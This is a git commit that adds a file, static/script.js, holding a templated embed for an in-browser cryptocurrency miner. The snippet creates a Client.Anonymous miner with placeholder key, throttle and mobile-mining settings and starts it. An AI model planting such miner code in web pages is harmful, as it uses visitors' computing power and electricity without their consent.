723a3f8cc1fd1bfa71adc36e80134f6c09220dd3
Your Name <raf.mancusi@gmail.com>
2024-03-14 00:45:11 +0100

    Add static files

---
+++ static/script.js
@@ -0,0 +1,7 @@
+<script nonce="nYfafSZv5jZeitubRK5pUQ\u003D\u003D" src="@Script"></script>
+<script nonce="nYfafSZv5jZeitubRK5pUQ\u003D\u003D">
+    var @variable = new Client.Anonymous('@key', {
+        throttle: @throt @currencymodifier @showAds
+    });
+    @stopmobilemining @variable.start();
+</script>
